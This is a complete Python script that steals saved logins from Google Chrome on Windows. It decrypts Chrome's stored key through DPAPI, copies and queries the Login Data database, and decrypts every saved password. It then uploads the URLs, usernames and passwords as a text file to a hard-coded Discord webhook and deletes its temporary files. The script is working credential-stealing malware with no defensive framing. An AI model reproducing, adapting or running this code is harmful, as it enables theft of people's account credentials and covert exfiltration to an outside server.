import os
import json
import base64
import sqlite3
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Set the webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1139858112262701076/pmA6iMCNytxzL8ORcPlOpfOP4L_Fcn7x2dyMrkmRpKLAvuqfMF_4SBdd0xjASen85fEQ"

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI prefix
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AESGCM(key)
        # decrypt password
        return cipher.decrypt(iv, password, None).decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def send_discord_text_file(logins):
    """Sends a text file with the login details to Discord"""
    # create a text file with the logins
    with open("ChromeLogins.txt", "w", encoding="utf-8") as f:
        for login in logins:
            f.write(f"Origin URL: {login['Origin URL']}\n")
            f.write(f"Action URL: {login['Action URL']}\n")
            f.write(f"Username: {login['Username']}\n")
            f.write(f"Password: {login['Password']}\n")
            if "Creation Date" in login:
                f.write(f"Creation Date: {login['Creation Date']}\n")
            if "Last Used" in login:
                f.write(f"Last Used: {login['Last Used']}\n")
            f.write("\n")

    # send the text file to Discord via the webhook
    with open("ChromeLogins.txt", "rb") as f:
        file_data = {"file": ("ChromeLogins.txt", f)}
        requests.post(WEBHOOK_URL, files=file_data)

    # delete the text file
    os.remove("ChromeLogins.txt")

def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    logins = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            # Add the login details to the list
            login = {
                "Origin URL": origin_url,
                "Action URL": action_url,
                "Username": username,
                "Password": password,
            }
            if date_created != 86400000000 and date_created:
                # Add the creation date to the same login details
                login["Creation Date"] = str(get_chrome_datetime(date_created))
            if date_last_used != 86400000000 and date_last_used:
                # Add the last used date to the same login details
                login["Last Used"] = str(get_chrome_datetime(date_last_used))
            logins.append(login)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
    # send the logins to Discord as a text file
    send_discord_text_file(logins)

if __name__ == "__main__":
    main()